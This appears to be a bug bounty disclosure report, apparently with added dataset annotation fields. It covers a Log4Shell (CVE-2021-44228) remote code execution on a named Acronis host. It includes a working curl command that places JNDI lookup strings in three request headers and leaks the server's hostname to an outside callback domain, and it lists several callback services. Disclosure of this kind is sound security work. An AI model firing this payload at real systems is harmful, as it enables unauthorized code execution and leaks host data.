title: [CVE-2021-44228] Arbitrary Code Execution on ng01-cloud.acronis.com
content:
Description
The application is using a vulnerable version of Log4j which allows arbitrary remote command execution. The vulnerability is also known as Log4Shell and is assigned CVE-2021-44228.
Reproduction Steps
For easier reproduction, please use Burp Collaborator and issue the following curl command with your collaborator instance URL;
Code 296 Bytes
1curl --http1.1 --silent --output /dev/null \
2--header 'User-agent: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
3--header 'X-Forwarded-For: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
4--header 'Referer: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
5https://ng01-cloud.acronis.com
You should receive a request to your Collaborator Client with your server's hostname as the prefix. That should suffice to prove that the host is vulnerable. The hostname I received was ng01-cloud-elk-ls-vm01.
Note that it may take some time to receive the pingbacks. In case Burp Collaborator doesn't work, I'd advise using your own. Some alternatives are;
dig.pm
app.interactsh.com
dnslog.cn
pingb.in
requestbin.net
canarytokens.com
Reference
https://www.lunasec.io/docs/blog/log4j-zero-day/
Impact
Arbitrary remote code execution
steps: Use Burp Collaborator or an alternative service to generate a unique URL for receiving requests.
Execute the curl command with the generated URL in the User-agent, X-Forwarded-For, and Referer headers targeting https://ng01-cloud.acronis.com.
vuln_description: The application is using a vulnerable version of Log4j, which allows arbitrary remote command execution via the Log4Shell vulnerability (CVE-2021-44228). This can be exploited by sending specially crafted headers containing JNDI lookup strings.
reason: The vulnerability is straightforward to exploit once the tester is aware of the Log4Shell vulnerability and knows how to craft the JNDI lookup strings. The attack involves sending a simple HTTP request with malicious headers, and the interaction is direct and well-documented.
